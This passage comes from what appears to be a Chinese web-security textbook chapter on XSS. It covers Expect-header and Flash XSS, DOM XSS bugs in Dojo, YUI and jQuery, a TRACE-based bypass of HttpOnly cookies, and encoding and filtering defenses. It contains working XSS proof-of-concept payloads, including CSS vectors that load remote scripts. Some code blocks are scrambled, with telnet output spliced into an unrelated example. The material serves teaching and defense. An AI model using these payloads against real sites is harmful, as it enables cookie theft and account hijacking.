<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<HTML><HEAD>
<TITLE>417 Expectation Failed</TITLE>
</HEAD><BODY>
<H1>Expectation Failed</H1>
The expectation given in the Expect request-header
field could not be met by this server.<P>
The client sent<PRE>
Expect: <script>alert('http://www.whiteacid.org is vulnerable to the Expect Header
vulnerability.');</script>
</PRE>
but we only allow the 100-continue expectation.
</BODY></HTML>
0

```

注意到服务器在出错返回时，会把Expect头的内容未经任何处理便写入到页面中，因此Expect头中的HTML代码就被浏览器解析执行了。这是Apache的漏洞，影响范围相当广。从这个攻击过程可以看出，需要在提交请求时向HTTP头中注入恶意数据，才能触发这个漏洞。但对于XSS攻击来说，JavaScript工作在渲染后的浏览器环境中，无法控制用户浏览器发出的HTTP头。因此，这个漏洞曾经一度被认为是“鸡肋”漏洞。

后来安全研究者Amit Klein提出了“使用Flash构造请求”的方法，成功地利用了这个漏洞，变废为宝！



在Flash中发送HTTP请求时，可以自定义大多数的HTTP头。如下是Amit Klein的演示代码：//Credits to Amit Klein as he wrote this, I just decompiled it


```
inURL = this._url;
inPOS = inURL.lastIndexOf("?");
inParam = inURL.substring(inPOS + 1, inPOS.length);
req = new LoadVars();
req.addRequestHeader("Expect", "<script>alert(\'" + inParam + " is vulnerable to the
Expect Header vulnerability.\ ');</script>");
req.send(inParam, "_blank", "POST");

```

正因为此，Flash在新版本中禁止用户自定义发送Expect头。但后来发现可以通过注入HTTP头的方式绕过这个限制：


```
req.addRequestHeader("Expect:FooBar","<script>alert('XSS')</script>");

```

目前Flash已经修补好了这些问题。
此类攻击，还可以通过Java Applet等构造HTTP请求的第三方插件来实现。


<hr />
Anehta的回旋镖


反射型XSS也有可能像存储型XSS一样利用：将要利用的反射型XSS嵌入一个存储型XSS中。这个攻击技巧，曾经在笔者实现的一个XSS攻击平台（Anehta）中使用过，笔者将其命名为“回旋镖”。
因为浏览器同源策略的原因，XSS也受到同源策略的限制——发生在A域上的XSS很难影响到B域的用户。
回旋镖的思路就是：如果在B域上存在一个反射型“XSS_B”，在A域上存在一个存储型“XSS_A”，当用户访问A域上的“XSS_A”时，同时嵌入B域上的“XSS_B”，则可以达到在A域的XSS攻击B域用户的目的。



我们知道，在IE中，``<iframe>、<img>、<link>``等标签都会拦截“第三方Cookie”的发送，而在Firefox中则无这种限制（第三方Cookie即指保存在本地的Cookie，也就是服务器设置了expire时间的Cookie）。

所以，对于Firefox来说，要实现回旋镖的效果非常简单，只需要在XSS_A处嵌入一个iframe即可：``<iframe src="http://www.b.com/?xss.... " ></iframe>``
但是对于IE来说，则要麻烦很多。为了达到执行XSS_B的目的，可以使用一个<form>标签，在浏览器提交form表单时，并不会拦截第三方Cookie的发送。



因此，先在XSS_A上写入一个<form>，自动提交到XSS_B，然后在XSS_B中再跳转回原来的XSS_A，即完成一个“回旋镖”的过程。但是这种攻击的缺点是，尽管跳转花费的时间很短，但用户还是会看到浏览器地址栏的变化。



如果能在B域上找到一个302跳转的页面，也可以不使用form表单，这样会更加方便。
虽然“回旋镖”并不是一种完美的漏洞利用方式，但也能将反射型XSS的效果变得更加自动化。
XSS漏洞是一个Web安全问题，不能因为它的利用难易程度而决定是否应该修补。随着技术的发展，某些难以利用的漏洞，也许不再是难题。


<hr />
### 3.2.8 容易被忽视的角落：Flash XSS



前文讲到的XSS攻击都是基于HTML的，其实在Flash中同样也有可能造成XSS攻击。
在Flash中是可以嵌入ActionScript脚本的。一个最常见的Flash XSS可以这样写：


```
getURL("javascript:alert(document.cookie)")
将Flash嵌入页面中：
<embed src="http://yourhost/evil.swf"
pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=S
hockwaveFlash"
type="application/x-shockwave-flash"
width="0"
height="0"
></embed>
>ActionScript是一种非常强大和灵活的脚本，甚至可以使用它发起网络连接，因此应该尽可能地禁止用户能够上传或加载自定义的Flash文件。
>

```


2016-04-06


```
由于Flash文件如此危险，所以在实现XSS Filter时，一般都会禁用<embed>、<object>等标签。后者甚至可以加载ActiveX控件，能够产生更为严重的后果。


如果网站的应用一定要使用Flash怎么办？一般来说，如果仅仅是视频文件，则要求转码为“flv文件”。flv文件是静态文件，不会产生安全隐患。如果是带动态脚本的Flash，则可以通过Flash的配置参数进行限制。


>常见的嵌入Flash的代码如下：
><object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000"
>codebase="http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#versi
>on=8,0,0,0"
>name="Main" width="1000" height="600" align="middle" id="Main">

<embed flashvars="site=&sitename=" src='Loading.swf?user=453156346' width="1000"
height="600" align="middle" quality="high" name="Main" allowscriptaccess="sameDomain"
type="application/x-shockwave-flash"
pluginspage="http://www.macromedia.com/go/getflashplayer" />

</object>


```


限制Flash动态脚本的最重要的参数是“allowScriptAccess”，这个参数定义了Flash能否与HTML页面进行通信。它有三个可选值：
always，对与HTML的通信也就是执行JavaScript不做任何限制；
sameDomain，只允许来自于本域的Flash与Html通信，这是默认值；
never，绝对禁止Flash与页面通信。
使用always是非常危险的，一般推荐使用never。如果值为sameDomain的话，请务必确保Flash文件不是用户传上来的。



`allowNetworking`也非常关键，这个参数能控制Flash与外部网络进行通信。它有三个可选值：
all，允许使用所有的网络通信，也是默认值；
internal，Flash不能与浏览器通信如navigateToURL，但是可以调用其他的API；
none，禁止任何的网络通信。
一般建议此值设置为none或者internal。设置为all可能带来安全问题。



除了用户的Flash文件能够实施脚本攻击外，一些Flash也可能会产生XSS漏洞。看如下ActionScript代码：


```
on (release) {
getURL (_root.clickTAG, "_blank");
}

```

这段代码经常出现在广告的Flash中，用于控制用户点击后的URL。但是这段代码缺乏输入验证，可以被XSS攻击：


```
http://url/to/flash-file.swf?clickTAG=javascript:alert('xss')
```

安全研究者Stefano Di Paola曾经写了一个叫“SWFIntruder”的工具来检测产生在Flash里的XSS漏洞，通过这个工具可以检测出很多注入Flash变量导致的XSS问题。



要修补本例中的漏洞，可以使用输入检查的方法：

```javascript
on (release) {
  if (_root.clickTAG.substring(0,5)== "http:" ||
  _root.clickTAG.substring(0,6)== "https:" ||
  _root.clickTAG.substring(0,1)== "/") {
    getURL (_root.clickTAG, "_blank");
  }
}

```


Flash XSS往往被开发者所忽视。注入Flash变量的XSS，因为其问题出现在编译后的Flash文件中，一般的扫描工具或者代码审计工具都难以检查，常常使其成为漏网之鱼。
OWASP为Flash安全研究设立了一个Wiki页面，有兴趣的读者可以参考。

 3.2.9 真的高枕无忧吗：JavaScript开发框架



在Web前端开发中，一些JavaScript开发框架深受开发者欢迎。利用JavaScript开发框架中的各种强大功能，可以快速而简洁地完成前端开发。
一般来说，成熟的JavaScript开发框架都会注意自身的安全问题。但是代码是人写的，高手偶尔也会犯错。一些JavaScript开发框架也曾暴露过一些XSS漏洞。



DojoDojo是一个流行的JavaScript开发框架，它曾被发现存在XSS漏洞。在Dojo 1.4.1中，存在两个“DOM Based XSS”：
File: dojo-release-1.4.1-src\dojo-release-1.4.1-src\dijit\tests\_testCommon.js
用户输入由theme参数传入，然后被赋值给变量themeCss，最终被document.write到页面里：


```javascript
Line 25:
var str = window.location.href.substr(window.location.href.indexOf("?")+1).split(/#/);

Line 54:
..snip..
var themeCss = d.moduleUrl("dijit.themes",theme+"/"+theme+".css");
var themeCssRtl = d.moduleUrl("dijit.themes",theme+"/"+theme+"_rtl.css");
document.write('<link rel="stylesheet" type="text/css" href="'+themeCss+'">');
document.write('<link rel="stylesheet" type="text/css" href="'+themeCssRtl+'">');所以凡是引用了_testCommon.js的文件，都受影响。POC如下：
http://WebApp/dijit/tests/form/test_Button.html?theme="/><script>alert(/xss/)</script>
类似的问题还存在于：
File: dojo-release-1.4.1-src\dojo-release-1.4.1-src\util\doh\runner.html
它也是从window.location传入了用户能够控制的数据，最终被document.write到页面：
Line 40:
var qstr = window.location.search.substr(1);
..snip..

Line 64:
document.write("<scr"+"ipt type='text/javascript' djConfig='isDebug: true'
src='"+dojoUrl+"'></scr"+"ipt>");
..snip..
document.write("<scr"+"ipt type='text/javascript' src='"+testUrl+".js'></scr"+"ipt>");
POC如下：
http://WebApp/util/doh/runner.html?dojoUrl='/>foo</script><'
"<script>alert(/xss/)</script>

```

这些问题在Dojo 1.4.2版本中已经得到修补。但是从这些漏洞可以看到，使用JavaScript开发框架也并非高枕无忧，需要随时关注可能出现的安全问题。


<hr />
### YUI


翻翻YUI的bugtracker，也可以看到类似Dojo的问题。

在YUI 2.8.1中曾经fix过一个“DOM Based XSS”。YUI的History Manager功能中有这样一个问题，打开官方的demo页：

```
http://developer.yahoo.com/yui/examples/history/history-navbar_source.html

```
点击一个Tab页，等待页面加载完成后，在URL的hash中插入恶意脚本。构造的XSS如下：

```
http://developer.yahoo.com/yui/examples/history/history-navbar_source.html#navbar=hom
e<script>alert(1)</script>

```

脚本将得到执行。其原因是在history.js的_updateIframe方法中信任了用户可控制的变量：

```
html = '<html><body><div id="state">' + fqstate + '</div></body></html>;

```
最后被写入到页面导致脚本执行。YUI的修补方案是对变量进行了htmlEscape。


<hr />
### jQuery

jQuery可能是目前最流行的JavaScript框架。它本身出现的XSS漏洞很少。但是开发者应该记住的是，JavaScript框架只是对JavaScript语言本身的封装，并不能解决代码逻辑上产生的问题。所以开发者的意识才是安全编码的关键所在。
在jQuery中有一个html()方法。这个方法如果没有参数，就是读取一个DOM节点的innerHTML；如果有参数，则会把参数值写入该DOM节点的innerHTML中。这个过程中有可能产生“DOM Based XSS”：$('div.demo-container').html("<img src=# onerror=alert(1) />");
如上，如果用户能够控制输入，则必然会产生XSS。在开发过程中需要注意这些问题。
使用JavaScript框架并不能让开发者高枕无忧，同样可能存在安全问题。除了需要关注框架本身的安全外，开发者还要提高安全意识，理解并正确地使用开发框架。


<hr />
### 3.3 XSS的防御



XSS的防御是复杂的。



流行的浏览器都内置了一些对抗XSS的措施，比如Firefox的CSP、Noscript扩展，IE 8内置的XSS Filter等。而对于网站来说，也应该寻找优秀的解决方案，保护用户不被XSS攻击。

 3.3.1 四两拨千斤：HttpOnly



HttpOnly
HttpOnly最早是由微软提出，并在IE 6中实现的，至今已经逐渐成为一个标准。浏览器将禁止页面的JavaScript访问带有HttpOnly属性的Cookie。
以下浏览器开始支持HttpOnly：

```
Microsoft IE 6 SP1+
Mozilla Firefox 2.0.0.5+
Mozilla Firefox 3.0.0.6+
Google Chrome
Apple Safari 4.0+
Opera 9.5+

```
严格地说，HttpOnly并非为了对抗XSS——HttpOnly解决的是XSS后的Cookie劫持攻击。
在“初探XSS Payload”一节中，曾演示过“如何使用XSS窃取用户的Cookie，然后登录进该用户的账户”。但如果该Cookie设置了HttpOnly，则这种攻击会失败，因为JavaScript读取不到Cookie的值。
一个Cookie的使用过程如下。
Step1：浏览器向服务器发起请求，这时候没有Cookie。
Step2：服务器返回时发送Set-Cookie头，向客户端浏览器写入Cookie。Step3：在该Cookie到期前，浏览器访问该域下的所有页面，都将发送该Cookie。
HttpOnly是在Set-Cookie时标记的：

```
Set-Cookie: <name>=<value>[; <Max-Age>=<age>]
[; expires=<date>][; domain=<domain_name>]
[; path=<some_path>][; secure][; HttpOnly]

```
需要注意的是，服务器可能会设置多个Cookie（多个key-value对），而HttpOnly可以有选择性地加在任何一个Cookie值上。
在某些时候，应用可能需要JavaScript访问某几项Cookie，这种Cookie可以不设置HttpOnly标记；而仅把HttpOnly标记给用于认证的关键Cookie。
HttpOnly的使用非常灵活。如下是一个使用HttpOnly的过程。

```
<?php

header("Set-Cookie: cookie1=test1;");
header("Set-Cookie: cookie2=test2;httponly", false);

?>

<script>
  alert(document.cookie);
</script>

```
在这段代码中，cookie1没有HttpOnly，cookie2被标记为HttpOnly。两个Cookie均被写入浏览器：测试页面的HTTP响应头
浏览器确实接收了两个Cookie：
浏览器接收到两个Cookie
但是只有cookie1被JavaScript读取到：
cookie1被JavaScript读取HttpOnly起到了应有的作用。



在不同的语言中，给Cookie添加HttpOnly的代码如下：

```
Java EE
response.setHeader("Set-Cookie", "cookiename=value;  Path=/;Domain=domainvalue;Max-Ag
e=seconds;HTTPOnly");
C#
HttpCookie myCookie = new HttpCookie("myCookie");
myCookie.HttpOnly = true;
Response.AppendCookie(myCookie);
VB.NET
Dim myCookie As HttpCookie = new HttpCookie("myCookie")
myCookie.HttpOnly = True
Response.AppendCookie(myCookie)
但是在.NET 1.1中需要手动添加：$ telnet foo.com 80
Trying 127.0.0.1...
Connected to foo.bar.
Escape character is ‘^]’.
TRACE / HTTP/1.1
Host: foo.bar
X-Header: test


HTTP/1.1 200 OK
Date: Mon, 02 Dec 2002 19:24:51 GMT
Server: Apache/2.0.40 (Unix)
Content-Type: message/http

TRACE / HTTP/1.1
Host: foo.bar
X-Header: test
Response.Cookies[cookie].Path += ";HTTPOnly";PHP 4
header("Set-Cookie: hidden=value; httpOnly");
PHP 5
setcookie("abc", "test", NULL, NULL, NULL, NULL, TRUE);

```
最后一个参数为HttpOnly属性。
添加HttpOnly的过程简单，效果明显，有如四两拨千斤。但是在部署时需要注意，如果业务非常复杂，则需要在所有Set-Cookie的地方，给关键Cookie都加上HttpOnly。漏掉了一个地方，都可能使得这个方案失效。
在过去几年中，曾经出现过一些能够绕过HttpOnly的攻击方法。Apache支持的一个Header是TRACE。TRACE一般用于调试，它会将请求头作为HTTP Response Body返回。



利用这个特性，可以把HttpOnly Cookie读出来。

```
<script type="text/javascript">
<!--
function sendTrace () {
    var xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
    xmlHttp.open("TRACE", "http://foo.bar",false);
    xmlHttp.send();
    xmlDoc=xmlHttp.responseText;
    alert(xmlDoc);
}
//-->
</script>
<INPUT TYPE=BUTTON OnClick="sendTrace();" VALUE="Send Trace Request">

```

结果如下：JavaScript读取到cookie
目前各厂商都已经修补了这些漏洞，但是未来也许还会有新的漏洞出现。现在业界给关键业务添加HttpOnly Cookie已经成为一种“标准”的做法。
但是，HttpOnly不是万能的，添加了HttpOnly不等于解决了XSS问题。
XSS攻击带来的不光是Cookie劫持问题，还有窃取用户信息、模拟用户身份执行操作等诸多严重的后果。如前文所述，攻击者利用AJAX构造HTTP请求，以用户身份完成的操作，就是在不知道用户Cookie的情况下进行的。
使用HttpOnly有助于缓解XSS攻击，但仍然需要其他能够解决XSS漏洞的方案。

 3.3.2 输入检查



输入检查
常见的Web漏洞如XSS、SQL Injection等，都要求攻击者构造一些特殊字符，这些特殊字符可能是正常用户不会用到的，所以输入检查就有存在的必要了。
输入检查，在很多时候也被用于格式检查。例如，用户在网站注册时填写的用户名，会被要求只能为字母、数字的组合。比如“hello1234”是一个合法的用户名，而“hello#$^”就是一个非法的用户名。
又如注册时填写的电话、邮件、生日等信息，都有一定的格式规范。比如手机号码，应该是不长于16位的数字，且中国大陆地区的手机号码可能是13x、15x开头的，否则即为非法。
这些格式检查，有点像一种“白名单”，也可以让一些基于特殊字符的攻击失效。
输入检查的逻辑，必须放在服务器端代码中实现。如果只是在客户端使用JavaScript进行输入检查，是很容易被攻击者绕过的。目前Web开发的普遍做法，是同时在客户端JavaScript中和服务器端代码中实现相同的输入检查。客户端JavaScript的输入检查，可以阻挡大部分误操作的正常用户，从而节约服务器资源。
在XSS的防御上，输入检查一般是检查用户输入的数据中是否包含一些特殊字符，如<、>、’、”等。如果发现存在特殊字符，则将这些字符过滤或者编码。
比较智能的“输入检查”，可能还会匹配XSS的特征。比如查找用户数据中是否包含了`<script>` 、`javascript` 等敏感字符。
这种输入检查的方式，可以称为`XSS Filter`。互联网上有很多开源的`XSS Filter`的实现。



XSS Filter在用户提交数据时获取变量，并进行XSS检查；但此时用户数据并没有结合渲染页面的HTML代码，因此XSS Filter对语境的理解并不完整。
比如下面这个XSS漏洞：

```
<script src="$var" ></script>

```
其中``$var``是用户可以控制的变量。用户只需要提交一个恶意脚本所在的URL地址，即可实施XSS攻击。



如果是一个``全局性的XSS Filter``，则无法看到用户数据的输出语境，而只能看到用户提交了一个URL，就很可能会漏报。因为在大多数情况下，URL是一种合法的用户数据。



XSS Filter还有一个问题——其对“<”、“>”等字符的处理，可能会改变用户数据的语义。



对于XSS Filter来说，发现了敏感字符“<”。如果XSS Filter不够“智能”，粗暴地过滤或者替换了“<”，则可能会改变用户原本的意思。
输入数据，还可能会被展示在多个地方，每个地方的语境可能各不相同，如果使用单一的替换操作，则可能会出现问题。

 3.3.3 输出检查



一般来说，除了富文本的输出外，在变量输出到HTML页面时，可以使用编码或转义的方式来防御XSS攻击。



编码分为很多种，针对HTML代码的编码方式是`HtmlEncode`。
`HtmlEncode`并非专用名词，它只是一种函数实现。它的作用是将字符转换成`HTMLEntities`，对应的标准是ISO-8859-1。
为了对抗XSS，在HtmlEncode中要求至少转换以下字符：


```
& --> &amp;
< --> &lt;
> --> &gt;
> " --> &quot;
> ' --> &#x27;　　 &apos; 不推荐
> / --> &#x2F;　　 包含反斜线是因为它可能会闭合一些HTML entity
> 在PHP中，有htmlentities()和htmlspecialchars()两个函数可以满足安全要求。
> 相应地，JavaScript的编码方式可以使用JavascriptEncode。
> JavascriptEncode与HtmlEncode的编码方法不同，它需要使用“\”对特殊字符进行转义。在对抗XSS时，还要求输出的变量必须在引号内部，以避免造成安全问题。比较下面两种写法：
> var x = escapeJavascript($evil);

var y = '"'+escapeJavascript($evil)+'"';
如果escapeJavascript()函数只转义了几个危险字符，比如‘、”、<、>、\、&、#等，那么上面的两行代码输出后可能会变成：
var x = 1;alert(2);

var y = "1;alert(2)";
第一行执行额外的代码了；第二行则是安全的。对于后者，攻击者即使想要逃逸出引号的范围，也会遇到困难：
var y = "\";alert(1);\/\/";
所以要求使用JavascriptEncode的变量输出一定要在引号内。
可是很多开发者没有这个习惯怎么办？这就只能使用一个更加严格的JavascriptEncode函数来保证安全——除了数字、字母外的所有字符，都使用十六进制“\xHH”的方式进行编码。在本例中：
var x = 1;alert(2);
变成了：
var x = 1\x3balert\x282\x29;如此代码可以保证是安全的。
在OWASP ESAPI中有一个安全的JavascriptEncode的实现，非常严格。
        /**
         * {@inheritDoc}
         *
         * Returns backslash encoded numeric format. Does not use backslash character escapes
         * such as, \" or \' as these may cause parsing problems. For example, if a javascript
         * attribute, such as onmouseover, contains a \" that will close the entire attribute and
         * allow an attacker to inject another script attribute.
     *
     * @param immune
     */
        public String encodeCharacter( char[] immune, Character c ) {

                // check for immune characters
                if ( containsCharacter(c, immune ) ) {
                        return ""+c;
                }

                // check for alphanumeric characters
                String hex = Codec.getHexForNonAlphanumeric(c);
                if ( hex == null ) {
                        return ""+c;
                }

                // Do not use these shortcuts as they can be used to break out of a context
                // if ( ch == 0x00 ) return "\\0";
                // if ( ch == 0x08 ) return "\\b";
                // if ( ch == 0x09 ) return "\\t";
                // if ( ch == 0x0a ) return "\\n";
                // if ( ch == 0x0b ) return "\\v";
                // if ( ch == 0x0c ) return "\\f";
                // if ( ch == 0x0d ) return "\\r";
                // if ( ch == 0x22 ) return "\\\"";
                // if ( ch == 0x27 ) return "\\'";
                // if ( ch == 0x5c ) return "\\\\";

                // encode up to 256 with \\xHH
        String temp = Integer.toHexString(c);
                if ( c < 256 ) {
                String pad = "00".substring(temp.length() );
                return "\\x" + pad + temp.toUpperCase();
                }

                // otherwise encode with \\uHHHH
        String pad = "0000".substring(temp.length() );
        return "\\u" + pad + temp.toUpperCase();
        }


```

除了HtmlEncode、JavascriptEncode外，还有许多用于各种情况的编码函数，比如XMLEncode（其实现与HtmlEncode类似）、JSONEncode（与JavascriptEncode类似）等。
在“Apache Common Lang”的“StringEscapeUtils”里，提供了许多escape的函数。




```
import org.apache.commons.lang.StringEscapeUtils;

public class StringUtilsEscapeExampleV1 {

  public static void main(String args[]) {
    String unescapedJava = "Are you for real?";
    System.err.println(StringEscapeUtils.escapeJava(unescapedJava));

    String unescapedJavaScript = "What's in a name?";
    System.err.println(StringEscapeUtils.escapeJavaScript(unescapedJavaScript));

    String unescapedSql = "Mc'Williams";
    System.err.println(StringEscapeUtils.escapeSql(unescapedSql));

    String unescapedXML = "<data>";
    System.err.println(StringEscapeUtils.escapeXml(unescapedXML));

    String unescapedHTML = "<data>";
    System.err.println(StringEscapeUtils.escapeHtml(unescapedHTML));
  }
}


```

可以在适当的情况下选用适当的函数。需要注意的是，编码后的数据长度可能会发生改变，从而影响某些功能。在写代码时需要注意这个细节，以免产生不必要的bug。



只需一种编码吗
XSS攻击主要发生在MVC架构中的View层。大部分的XSS漏洞可以在模板系统中解决。
在Python的开发框架Django自带的模板系统“Django Templates”中，可以使用escape进行HtmlEncode。比如：

```
{{ var|escape }}

```

这样写的变量，会被HtmlEncode编码。
这一特性在Django 1.0中得到了加强——默认所有的变量都会被escape。这个做法是值得称道的，它符合“Secure By Default”原则。
在Python的另一个框架web2py中，也默认escape了所有的变量。在web2py的安全文档中，有这样一句话：
web2py, by default, escapes all variables rendered in the view, thus preventing XSS.
Django和web2py都选择在View层默认HtmlEncode所有变量以对抗XSS，出发点很好。但是，像web2py这样认为这就解决了XSS问题，是错误的观点。



XSS是很复杂的问题，需要“在正确的地方使用正确的编码方式”。看看下面这个例子：


```html
<body>
<a href=# onclick="alert('$var');" >test</a>
</body>开发者希望看到的效果是，用户点击链接后，弹出变量“$var”的内容。可是用户如果输入：
$var = htmlencode("');alert('2");
对变量“$var”进行HtmlEncode后，渲染的结果是：
<body>
<a href=# onclick="alert('&#x27;&#x29;&#x3b;alert&#x28;&#x27;2');" >test</a>
</body>
对于浏览器来说，htmlparser会优先于JavaScript Parser执行，所以解析过程是，被HtmlEncode的字符先被解码，然后执行JavaScript事件。
因此，经过htmlparser解析后相当于：
<body>
<a href=# onclick="alert('');alert('2');" >test</a>
</body>

```

成功在onclick事件中注入了XSS代码！



第一次弹框：
执行第一个alert
第二次弹框：执行第二个alert
导致XSS攻击发生的原因，是由于没有分清楚输出变量的语境！因此并非在模板引擎中使用了auto-escape就万事大吉了，XSS的防御需要区分情况对待。

 3.3.4 正确地防御XSS



正确地防御XSS



为了更好地设计XSS防御方案，需要认清XSS产生的本质原因。
XSS的本质还是一种“HTML注入”，用户的数据被当成了HTML代码一部分来执行，从而混淆了原本的语义，产生了新的语义。
如果网站使用了MVC架构，那么XSS就发生在View层——在应用拼接变量到HTML页面时产生。所以在用户提交数据处进行输入检查的方案，其实并不是在真正发生攻击的地方做防御。
想要根治XSS问题，可以列出所有XSS可能发生的场景，再一一解决。
下面将用变量“$var”表示用户数据，它将被填充入HTML代码中。可能存在以下场景。
在HTML标签中输出


```
<div>$var</div>
<a href=# >$var</a>

```

所有在标签中输出的变量，如果未做任何处理，都能导致直接产生XSS。
在这种场景下，XSS的利用方式一般是构造一个<script>标签，或者是任何能够产生脚本执行的方式。比如：<div><script>alert(/xss/)</script></div>
或者


```
 <a href=# ><img src=# onerror=alert(1) /></a>

```

防御方法是对变量使用HtmlEncode。
在HTML属性中输出


```
<div id="abc" name="$var" ></div>

```

与在HTML标签中输出类似，可能的攻击方法：


```
 <div id="abc" name=""><script>alert(/xss/)</script><"" ></div>

```

防御方法也是采用HtmlEncode。
在OWASP ESAPI中推荐了一种更严格的HtmlEncode——除了字母、数字外，其他所有的特殊字符都被编码成HTMLEntities。
String safe = ESAPI.encoder().encodeForHTMLAttribute( request.getParameter( "input" ) );
这种严格的编码方式，可以保证不会出现任何安全问题。



在<script>标签中输出
在<script>标签中输出时，首先应该确保输出的变量在引号中：


```
<script>
var x = "$var";
</script>

```

攻击者需要先闭合引号才能实施XSS攻击：<script>

```
var x = "";alert(/xss/);//";
</script>

```

防御时使用JavascriptEncode。
在事件中输出
在事件中输出和在<script>标签中输出类似：

```
<a href=# onclick="funcA('$var')" >test</a>

```

可能的攻击方法：

```html
<a href=# onclick="funcA('');alert(/xss/);//')" >test</a>
```
在防御时需要使用JavascriptEncode。
在CSS中输出
在CSS和style、style attribute中形成XSS的方式非常多样化，参考下面几个XSS的例子。


```html
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
<XSS STYLE="behavior: url(xss.htc);">
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="width: expression(alert('XSS'));">

```

所以，一般来说，尽可能禁止用户可控制的变量在“<style>标签”、“HTML标签的style属性”以及“CSS文件”中输出。如果一定有这样的需求，则推荐使用OWASP ESAPI中的encodeForCSS()函数。


```
String safe = ESAPI.encoder().encodeForCSS( request.getParameter( "input" ) );
其实现原理类似于ESAPI.encoder().encodeForJavaScript()函数，除了字母、数字外的所有字符都被编码成十六进制形式“\uHH”。

```

在地址中输出

在地址中输出也比较复杂。一般来说，在URL的path（路径）或者search（参数）中输出，使用URLEncode即可。URLEncode会将字符转换为``%HH``形式，比如空格就是`%20`，`<`符号是``%3c``。

```html
<a href="http://www.evil.com/?test=$var" >test</a>

```
可能的攻击方法：

```html
<a href="http://www.evil.com/?test=" onclick=alert(1)"" >test</a>

```

经过URLEncode后，变成了：`<a href="http://www.evil.com/?test=%22%20onclick%3balert%281%29%22" >test</a>`
但是还有一种情况，就是整个URL能够被用户完全控制。这时URL的Protocal和Host部分是不能够使用URLEncode的，否则会改变URL的语义。



在Protocal 与Host中，如果使用严格的URLEncode函数，则会把“://”、“.”等都编码掉。
对于如下的输出方式：

```
<a href="$var" >test</a>

```

攻击者可能会构造伪协议实施攻击：

```
<a href="javascript:alert(1);" >test</a>

```
除了“javascript”作为伪协议可以执行代码外，还有“vbscript”、“dataURI”等伪协议可能导致脚本执行。
“dataURI”这个伪协议是Mozilla所支持的，能够将一段代码写在URL里。如下例：<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=">test</a>
这段代码的意思是，以text/html的格式加载编码为base64的数据，加载完成后实际上是：

```
<script>alert(1);</script>

```
点击<a>标签的链接，将导致执行脚本。



执行恶意脚本
由此可见，如果用户能够完全控制URL，则可以执行脚本的方式有很多。如何解决这种情况呢？
一般来说，如果变量是整个URL，则应该先检查变量是否以“http”开头（如果不是则自动添加），以保证不会出现伪协议类的XSS攻击。
<a href="$var" >test</a>
在此之后，再对变量进行URLEncode，即可保证不会有此类的XSS发生了。
OWASP ESAPI中有一个URLEncode的实现（此API未解决伪协议的问题）：

```
String safe = ESAPI.encoder().encodeForURL( request.getParameter( "input" ) );

```

<hr />
### 3.3.5 处理富文本



有些时候，网站需要允许用户提交一些自定义的HTML代码，称之为“富文本”。比如一个用户在论坛里发帖，帖子的内容里要有图片、视频，表格等，这些“富文本”的效果都需要通过HTML代码来实现。
如何区分安全的“富文本”和有攻击性的XSS呢？
在处理富文本时，还是要回到“输入检查”的思路上来。“输入检查”的主要问题是，在检查时还不知道变量的输出语境。但用户提交的“富文本”数据，其语义是完整的HTML代码，在输出时也不会拼凑到某个标签的属性中。因此可以特殊情况特殊处理。



列出了所有在HTML中可能执行脚本的地方。而一个优秀的“XSS Filter”，也应该能够找出HTML代码中所有可能执行脚本的地方。
HTML是一种结构化的语言，比较好分析。通过htmlparser可以解析出HTML代码的标签、标签属性和事件。



在过滤富文本时，“事件”应该被严格禁止，因为“富文本”的展示需求里不应该包括“事件”这种动态效果。而一些危险的标签，比如<iframe>、<script>、<base>、<form>等，也是应该严格禁止的。
在标签的选择上，应该使用白名单，避免使用黑名单。比如，只允许<a>、<img>、<div>等比较“安全”的标签存在。
“白名单原则”不仅仅用于标签的选择，同样应该用于属性与事件的选择。
在富文本过滤中，处理CSS也是一件麻烦的事情。如果允许用户自定义CSS、style，则也可能导致XSS攻击。因此尽可能地禁止用户自定义CSS与style。
如果一定要允许用户自定义样式，则只能像过滤“富文本”一样过滤“CSS”。这需要一个CSS Parser对样式进行智能分析，检查其中是否包含危险代码。



有一些比较成熟的开源项目，实现了对富文本的XSS检查。
Anti-Samy是OWASP上的一个开源项目，也是目前最好的XSS Filter。最早它是基于Java的，现在已经扩展到.NET等语言。


```
import org.owasp.validator.html.*;
Policy policy = Policy.getInstance(POLICY_FILE_LOCATION);
AntiSamy as = new AntiSamy();
CleanResults cr = as.scan(dirtyInput, policy);
MyUserDAO.storeUserProfile(cr.getCleanHTML()); // some custom function

```

在PHP中，可以使用另外一个广受好评的开源项目：HTMLPurify。

<hr />
### 3.3.6 防御DOM Based XSS



DOM Based XSS是如何形成的呢？回头看看这个例子：

```
<script>
function test(){
  var str = document.getElementById("text").value;
  document.getElementById("t").innerHTML = "<a href='"+str+"' >testLink</a>";
}
</script>

<div id="t" ></div>
<input type="text" id="text" value="" />
<input type="button" id="s" value="write" onclick="test()" />在button的onclick事件中，执行了test()函数，而该函数中最关键的一句是：
document.getElementById("t").innerHTML = "<a href='"+str+"' >testLink</a>";

```

将HTML代码写入了DOM节点，最后导致了XSS的发生。
事实上，DOM Based XSS是从JavaScript中输出数据到HTML页面里。而前文提到的方法都是针对“从服务器应用直接输出到HTML页面”的XSS漏洞，因此并不适用于DOM Based XSS。


<hr />
### 3.3.7 换个角度看XSS的风险



前文谈到的所有XSS攻击，都是从漏洞形成的原理上看的。如果从业务风险的角度来看，则会有不同的观点。
一般来说，存储型XSS的风险会高于反射型XSS。因为存储型XSS会保存在服务器上，有可能会跨页面存在。它不改变页面URL的原有结构，因此有时候还能逃过一些IDS的检测。比如IE 8的XSS Filter和Firefox的Noscript Extension，都会检查地址栏中的地址是否包含XSS脚本。而跨页面的存储型XSS可能会绕过这些检测工具。
